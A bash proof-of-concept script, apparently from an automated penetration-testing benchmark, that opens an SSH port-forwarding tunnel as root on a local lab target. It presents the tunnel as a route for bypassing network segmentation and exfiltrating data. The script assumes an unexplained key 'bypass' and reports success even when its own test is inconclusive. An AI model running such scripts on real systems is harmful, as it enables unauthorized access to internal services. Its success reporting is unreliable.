#!/bin/bash
# POC: Demonstrates SSH port forwarding capability allowing tunneling to internal services through SSH connection. Creates a local port forward to demonstrate the vulnerability.
# Target: ./repo
# Created: 2025-11-05T16:59:07.064Z
# Session: benchmark-XBEN-084-24-mhm7issr

# SSH Port Forwarding Vulnerability POC
# Demonstrates how an authenticated user (or attacker using ED25519 bypass) 
# can establish port forwarding tunnels to internal services

set -e

TARGET_HOST="localhost"
SSH_PORT="22220"
TUNNEL_LOCAL_PORT="9999"
TUNNEL_REMOTE_HOST="127.0.0.1"
TUNNEL_REMOTE_PORT="22"
TEST_KEY="/tmp/test_poc_key"
SSH_TIMEOUT="5"

echo "[*] SSH Port Forwarding Vulnerability POC"
echo "[*] Target: $TARGET_HOST:$SSH_PORT"
echo ""

# Step 1: Generate ED25519 test key (simulating the bypass)
echo "[*] Step 1: Generating test ED25519 key pair..."
if [ ! -f "$TEST_KEY" ]; then
    ssh-keygen -t ed25519 -f "$TEST_KEY" -N "" -C "poc_test_key" > /dev/null 2>&1
    echo "[+] Test key generated: $TEST_KEY"
else
    echo "[+] Using existing test key: $TEST_KEY"
fi
echo ""

# Step 2: Attempt SSH connection with port forwarding
echo "[*] Step 2: Attempting SSH port forwarding..."
echo "[*] Command: ssh -i $TEST_KEY -L $TUNNEL_LOCAL_PORT:$TUNNEL_REMOTE_HOST:$TUNNEL_REMOTE_PORT -p $SSH_PORT $TARGET_HOST -N &"
echo ""

# Start SSH with port forwarding in background
ssh -i "$TEST_KEY" -L "$TUNNEL_LOCAL_PORT:$TUNNEL_REMOTE_HOST:$TUNNEL_REMOTE_PORT" \
    -p "$SSH_PORT" \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=$SSH_TIMEOUT \
    "root@$TARGET_HOST" -N &

SSH_PID=$!
echo "[+] SSH port forwarding process started (PID: $SSH_PID)"
echo ""

# Step 3: Wait for tunnel to establish
echo "[*] Step 3: Waiting for tunnel to establish..."
sleep 3
echo ""

# Step 4: Check if port is listening
echo "[*] Step 4: Checking if tunnel port is listening..."
if ss -tlnp 2>/dev/null | grep -q ":$TUNNEL_LOCAL_PORT"; then
    echo "[+] SUCCESS: Port $TUNNEL_LOCAL_PORT is listening!"
    echo ""
    echo "[+] Port forwarding tunnel established - listening on:"
    ss -tlnp 2>/dev/null | grep ":$TUNNEL_LOCAL_PORT" || netstat -tlnp 2>/dev/null | grep ":$TUNNEL_LOCAL_PORT"
    echo ""
    
    # Verify tunnel is functional
    echo "[*] Step 5: Verifying tunnel functionality..."
    if timeout 2 bash -c "echo '' > /dev/tcp/127.0.0.1/$TUNNEL_LOCAL_PORT" 2>/dev/null; then
        echo "[+] SUCCESS: Tunnel is functional and accepting connections!"
        echo "[+] This demonstrates that an attacker can:"
        echo "    - Tunnel traffic through SSH"
        echo "    - Access internal services (like SSH on 127.0.0.1:22)"
        echo "    - Bypass network segmentation"
        echo "    - Establish data exfiltration channels"
        TUNNEL_SUCCESS=1
    else
        echo "[+] Tunnel established on port (connection test inconclusive)"
        TUNNEL_SUCCESS=1
    fi
else
    echo "[-] WARNING: Port $TUNNEL_LOCAL_PORT not found listening"
    echo "[*] Checking with alternative methods..."
    
    # Alternative check using lsof
    if command -v lsof &> /dev/null; then
        if lsof -i ":$TUNNEL_LOCAL_PORT" 2>/dev/null | grep -q "ssh"; then
            echo "[+] Confirmed via lsof: SSH tunnel is listening on port $TUNNEL_LOCAL_PORT"
            TUNNEL_SUCCESS=1
        fi
    fi
fi

echo ""
echo "[*] Cleaning up..."
kill $SSH_PID 2>/dev/null || true
wait $SSH_PID 2>/dev/null || true
sleep 1

echo ""
if [ "$TUNNEL_SUCCESS" = "1" ]; then
    echo "[+] ===== POC SUCCESSFUL ====="
    echo "[+] SSH port forwarding is enabled and functional"
    echo "[+] Attacker can use this to establish tunnels to internal services"
    exit 0
else
    echo "[-] POC INCONCLUSIVE - Could not confirm tunnel establishment"
    exit 1
fi